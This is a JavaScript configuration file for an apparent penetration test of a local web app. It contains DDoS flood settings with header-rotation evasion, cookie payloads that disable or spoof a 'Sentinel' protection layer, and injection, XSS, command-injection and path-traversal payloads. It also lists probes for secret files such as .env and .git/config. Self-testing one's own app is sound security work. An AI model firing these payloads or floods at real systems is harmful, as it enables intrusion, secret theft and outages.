// ================== KONFIGURASI PENETRATION TESTING ==================
const TARGET_URL = 'http://localhost:3000';

const DDOS_CONFIG = {
    METHOD: 'GET',
    TOTAL_REQUESTS: 2000,
    DURATION_SEC: 0,
    CONCURRENT: 500,
    USE_KEEP_ALIVE: true,
    IGNORE_SSL: false,
    EVASION_MODE: true // New: Rotate headers per request
};

const PROTECTED_ROUTES = [
    '/dashboard',
    '/dashboard/admin',
    '/dashboard/admin/sentinel',
    '/dashboard/admin/users',
    '/dashboard/admin/settings',
    '/dashboard/admin/analytics',
    '/dashboard/admin/ad-logs',
    '/dashboard/admin/email-logs',
    '/dashboard/profile',
    '/api/admin/stats'
];

const CRUD_ENDPOINTS = [
    '/api/courses',
    '/api/users',
    '/api/payments',
    '/api/settings',
    '/api/enrollments',
    '/api/vouchers',
    '/api/announcements',
    '/api/events'
];

const TIMEOUT_MS = 5000;

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Edge/121.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
];

const EXPLOIT_PAYLOADS = {
    SENTINEL_DISABLE: {
        name: 'Sentinel Config Poisoning',
        cookie: 'sentinel_config_cache={"ddos_protection_enabled":false,"maintenance_mode":false,"security_lockdown":false}'
    },
    SENTINEL_BYPASS: {
        name: 'Sentinel Verification Spoof',
        cookie: 'sentinel_verified=true'
    }
};

const PAYLOADS = [
    // SQL Injection
    { name: 'SQLi - Classic', data: { username: "admin' OR '1'='1", password: "password" } },
    { name: 'SQLi - Union', data: { id: "1' UNION SELECT null,null,username,password FROM users--" } },
    { name: 'SQLi - Blind', data: { id: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" } },
    
    // NoSQL Injection
    { name: 'NoSQL - Login Bypass', data: { username: { "$gt": "" }, password: { "$gt": "" } } },
    { name: 'NoSQL - Field Injection', data: { "$where": "this.role == 'admin'" } },
    
    // Privilege Escalation
    { name: 'Priv Esc - Role', data: { role: 'admin', is_admin: true, permissions: ['*'] } },
    { name: 'Priv Esc - Metadata', data: { metadata: { role: 'admin' } } },
    
    // Cross-Site Scripting (XSS)
    { name: 'XSS - Basic', data: { name: "<script>alert('XSS')</script>" } },
    { name: 'XSS - Img Error', data: { comment: "<img src=x onerror=alert(1)>" } },
    { name: 'XSS - SVG', data: { bio: "<svg/onload=alert(1)>" } },

    // Command Injection
    { name: 'RCE - Basic', data: { file: "; cat /etc/passwd" } },
    { name: 'RCE - Pipe', data: { cmd: "| whoami" } },

    // Path Traversal
    { name: 'Traversal', data: { path: "../../../etc/passwd" } }
];

const MISC_ENDPOINTS = [
    '/.env',
    '/.env.local',
    '/.env.development',
    '/.git/config',
    '/docker-compose.yml',
    '/nginx.conf',
    '/package.json',
    '/.next/server/pages-manifest.json',
    '/server.js',
    '/api/non-existent-endpoint-for-error-leak'
];

const RATE_LIMIT_ENDPOINTS = [
    '/api/auth/login',
    '/api/auth/register',
    '/api/auth/reset-password',
    '/dashboard/login',
    '/api/contact'
];

module.exports = {
    TARGET_URL,
    DDOS_CONFIG,
    PROTECTED_ROUTES,
    CRUD_ENDPOINTS,
    MISC_ENDPOINTS,
    RATE_LIMIT_ENDPOINTS,
    TIMEOUT_MS,
    USER_AGENTS,
    PAYLOADS,
    EXPLOIT_PAYLOADS
};
